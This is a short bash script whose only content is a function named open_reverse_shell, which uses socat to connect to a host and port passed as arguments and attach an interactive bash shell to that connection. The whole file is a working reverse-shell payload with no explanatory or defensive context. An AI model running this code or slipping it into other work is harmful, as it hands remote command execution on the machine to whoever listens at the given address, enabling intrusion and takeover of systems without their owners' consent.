#!/bin/bash
open_reverse_shell() {
    local host="$1"
    local port="$2"
    socat "TCP:${host}:${port}" EXEC:"bash -i"
}
